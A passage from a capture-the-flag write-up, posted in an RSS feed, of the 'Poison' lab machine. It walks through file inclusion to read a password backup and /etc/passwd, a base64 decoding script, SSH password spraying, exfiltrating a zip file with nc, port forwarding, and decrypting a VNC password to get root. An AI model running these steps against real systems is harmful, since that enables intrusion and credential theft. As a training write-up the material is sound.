TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   40.51 ms 10.10.14.1
2   40.65 ms 10.10.10.84

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 120.47 seconds
</code></pre><p>The scan shows that TCP ports 22 and 80 are open. Visiting the webpage on port 80, we can see a website with the title &ldquo;Temporary website to test local .php scripts&rdquo;.</p>
<p><img src="/img/poison/website.png" alt="website"></p>
<p>There is a list of files that we can test. I tried listfiles.php. The output was messy, so I used view source to get a cleaner view.</p>
<p><img src="/img/poison/listfiles.png" alt="listfiles.php result"></p>
<p>We get a directory listing. It appears as if browse.php is executing php files that are passed to it. http wrappers are disabled unfortunately, so we can&rsquo;t get a shell through RFI :(. We could also try other attack vectors like log poisoning (which does give you shell as <code>www-data</code>), but there is an interesting file &ldquo;pwdbackup.txt&rdquo; that we can check out first.</p>
<p><img src="/img/poison/encodedpass.png" alt="pwdbackup text"></p>
<p>Success! Now all we need to do is decode the password. We will need to do this 13 times, as implied by the note from out unsuspecting target. This can be done by passing the password to <code>base64 -d</code> manually, but it&rsquo;s far simpler to use a script. I&rsquo;ve provided one below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>encoded_pass<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo=&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i in <span style="color:#f92672">{</span>1..13<span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>        encoded_pass<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo -n <span style="color:#e6db74">&#34;</span>$encoded_pass<span style="color:#e6db74">&#34;</span> | base64 -d<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>echo -n <span style="color:#e6db74">&#34;</span>$encoded_pass<span style="color:#e6db74">&#34;</span>
</span></span></code></pre></div><p>After running the script, we get our password <code>Charix!2#4%6&amp;8(0</code>.</p>
<h3 id="foothold">Foothold</h3>
<p>We have a password, but we don&rsquo;t know any users we could potentially authenticate as. Recall that the webpage can read files. Since we know that the target machine is likely FreeBSD, a Unix-like OS, we can try to read the <code>/etc/passwd</code> to find users.</p>
<p><img src="/img/poison/traversal_passwd.png" alt="/etc/passwd file"></p>
<p>Notice there are three users: <code>root</code>, <code>toor</code>, and <code>charix</code> that seem interesting. We can spray our password against these accounts via ssh. It is true that <code>Charix!2#4%6&amp;8(0</code> is likely the password for <code>charix</code>, it&rsquo;s still worth checking the other accounts for password reuse.</p>
<p><img src="/img/poison/pass_spray.png" alt="Password spray"></p>
<p>And now we can authenticate as <code>charix</code> to the server.</p>
<h3 id="privilege-escalation">Privilege Escalation</h3>
<p>Now that we have a shell, we can move onto privilege escalation. Feel free to grab the user flag, but there is also a <code>secret.zip</code> file that might be interesting. It&rsquo;s password protected though, and I find files easier to investigate when they are on my local machine. So I transferred the zip file to Kali.</p>
<p>On Kali:</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ nc -nvlp 8000 &gt; secret.zip            
listening on [any] 8000 ...
</code></pre><p>On Poison:</p>
<pre tabindex="0"><code>charix@Poison:~ % nc -nv 10.10.14.33 8000 &lt; secret.zip
Connection to 10.10.14.33 8000 port [tcp/*] succeeded!
</code></pre><p>Before trying to crack the password, we can test for password reuse by supplying the password we got for <code>charix</code> . It succeeds and we get a <code>secret</code> file that appears to be random binary data. I couldn&rsquo;t figure out its purpose at this point, so I decided to enumerate further. I noticed three TCP ports only accessible from localhost on Poison: 25, 5801, and 5901.</p>
<pre tabindex="0"><code>charix@Poison:~ % sockstat -4
USER     COMMAND    PID   FD PROTO  LOCAL ADDRESS         FOREIGN ADDRESS      
www      httpd      728   4  tcp4   *:80                  *:*
charix   sshd       719   3  tcp4   10.10.10.84:22        10.10.14.33:57270
root     sshd       716   3  tcp4   10.10.10.84:22        10.10.14.33:57270
www      httpd      704   4  tcp4   *:80                  *:*
root     sendmail   642   3  tcp4   127.0.0.1:25          *:*
www      httpd      641   4  tcp4   *:80                  *:*
www      httpd      640   4  tcp4   *:80                  *:*
www      httpd      639   4  tcp4   *:80                  *:*
www      httpd      638   4  tcp4   *:80                  *:*
www      httpd      637   4  tcp4   *:80                  *:*
root     httpd      625   4  tcp4   *:80                  *:*
root     sshd       620   4  tcp4   *:22                  *:*
root     Xvnc       529   1  tcp4   127.0.0.1:5901        *:*
root     Xvnc       529   3  tcp4   127.0.0.1:5801        *:*
root     syslogd    390   7  udp4   *:514                 *:*
</code></pre><p>I had already checked for any mail-related privesc vectors at this point, so I was more interested in ports 5801 and 5901. However, since they were only accessible by localhost on Poison, I had to forward them to my attacker machine.</p>
<pre tabindex="0"><code># Forward Port 5801
ssh -N -L 5801:127.0.0.1:5801 charix@10.10.10.84

# Forward Port 5901
ssh -N -L 5901:127.0.0.1:5901 charix@10.10.10.84
</code></pre><p>Now we can do some more enumeration.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
└─$ sudo nmap -p5801,5901 127.0.0.1 -sV --script=default
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-17 19:27 GMT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000097s latency).

PORT     STATE SERVICE VERSION
5801/tcp open  http    Bacula http config
5901/tcp open  vnc     VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|     VNC Authentication (2)
|     Tight (16)
|   Tight auth subtypes: 
|_    STDV VNCAUTH_ (2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.83 seconds
</code></pre><p>VNC is running on port 5901. VNC is a system designed to share screens. This means that a user using VNC can interact with&hellip; The VNC password file is usually stored in <code>~/.vnc/passwd</code>. This path does not exist for <code>charix</code> though, but there was a <code>passwd</code> file that we extracted from <code>secret.zip</code>. We can check if it it indeed a VNC password file by attempting to extract a VNC password:</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ cat secret | openssl enc -des-cbc -nopad -nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d
VNCP@$$!
</code></pre><p>Success! Now that we are certain we have a VNC password file, we can use it to connect to Poison.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ vncviewer -passwd secret 127.0.0.1::5901
</code></pre><p><img src="/img/poison/vnc_pwn.png" alt="vnc successful connect"></p>
<p>And with that, we have root on the machine.</p>
]]></description>
      
    </item>
    
    
  </channel>
</rss>
